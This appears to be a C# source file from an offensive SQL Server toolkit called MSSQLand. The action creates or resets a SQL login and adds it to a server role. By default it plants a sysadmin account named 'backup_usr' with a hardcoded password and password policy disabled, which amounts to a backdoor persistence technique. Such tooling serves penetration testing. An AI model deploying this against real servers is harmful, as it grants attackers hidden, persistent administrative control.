// MSSQLand/Actions/Administration/UserAdd.cs

using MSSQLand.Services;
using MSSQLand.Utilities;
using System;

namespace MSSQLand.Actions.Administration
{
    /// <summary>
    /// Creates a new SQL Server login with specified server role privileges.
    /// </summary>
    internal class UserAdd : BaseAction
    {
        [ArgumentMetadata(Position = 0, ShortName = "u", LongName = "user", Description = "SQL login username")]
        private string _username = "backup_usr";

        [ArgumentMetadata(Position = 1, ShortName = "p", LongName = "password", Description = "SQL login password")]
        private string _password = "$ap3rlip0pe//e";

        [ArgumentMetadata(Position = 2, ShortName = "r", LongName = "role", Description = "Server role to assign")]
        private string _role = "sysadmin";

        public override void ValidateArguments(string[] args)
        {
            BindArguments(args);

            // Validate inputs
            if (string.IsNullOrWhiteSpace(_username))
            {
                throw new ArgumentException("Username cannot be empty.");
            }

            if (string.IsNullOrWhiteSpace(_password))
            {
                throw new ArgumentException("Password cannot be empty.");
            }

            if (string.IsNullOrWhiteSpace(_role))
            {
                throw new ArgumentException("Role cannot be empty.");
            }
        }

        public override object Execute(DatabaseContext databaseContext)
        {
            Logger.TaskNested($"Creating SQL login '{_username}'");
            Logger.TaskNested($"Password: '{_password}'");
            Logger.TaskNested($"Role: '{_role}'");

            try
            {
                // Escape single quotes in password
                string escapedPassword = _password.Replace("'", "''");

                // Try to create new login
                string createLoginQuery = $@"CREATE LOGIN [{_username}] WITH PASSWORD = '{escapedPassword}', CHECK_POLICY = OFF, CHECK_EXPIRATION = OFF;";
                databaseContext.QueryService.ExecuteNonProcessing(createLoginQuery);
                Logger.Success($"SQL login '{_username}' created successfully.");
            }
            catch (Exception ex) when (ex.Message.Contains("already exists"))
            {
                // Login exists, update password instead
                Logger.Warning($"SQL login '{_username}' already exists. Updating password.");

                string escapedPassword = _password.Replace("'", "''");
                string alterPasswordQuery = $@"ALTER LOGIN [{_username}] WITH PASSWORD = '{escapedPassword}';";
                databaseContext.QueryService.ExecuteNonProcessing(alterPasswordQuery);
                Logger.Success($"Password updated for '{_username}'.");
            }

            try
            {
                // Add the login to the specified server role
                Logger.TaskNested($"Adding '{_username}' to {_role} server role.");

                string addRoleToNewUserQuery = $"ALTER SERVER ROLE [{_role}] ADD MEMBER [{_username}];";
                databaseContext.QueryService.ExecuteNonProcessing(addRoleToNewUserQuery);

                Logger.Success($"'{_username}' added to {_role} role successfully.");

                return true;
            }
            catch (Exception ex)
            {
                if (ex.Message.Contains("already a member"))
                {
                    Logger.Info($"'{_username}' is already a member of {_role} role.");
                    return true;
                }

                if (ex.Message.Contains("permission") || ex.Message.Contains("denied"))
                {
                    Logger.Error($"Insufficient privileges: {ex.Message}");
                }
                else
                {
                    Logger.Error($"Failed to add user to role: {ex.Message}");
                }

                return false;
            }
        }
    }
}
